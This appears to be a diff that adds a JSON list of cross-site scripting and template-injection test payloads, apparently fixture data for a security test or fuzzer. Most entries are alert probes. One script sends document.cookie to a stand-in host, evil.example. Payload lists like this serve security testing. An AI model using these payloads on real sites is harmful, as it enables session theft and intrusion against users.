@@ -1,0 +1,14 @@
+[
+  "<script>alert('xss')</script>",
+  "<img src=x onerror=alert('xss')>",
+  "<svg/onload=alert('xss')>",
+  "<body onload=alert('xss')>",
+  "<iframe src=javascript:alert('xss')>",
+  "<a href=\"javascript:alert('xss')\">click</a>",
+  "\"><script>alert('xss')</script>",
+  "<script>fetch('https://evil.example/'+document.cookie)</script>",
+  "<details open ontoggle=alert('xss')>",
+  "<input autofocus onfocus=alert('xss')>",
+  "{{7*7}}",
+  "<math><malignmark></math><script>alert('xss')</script>"
+]
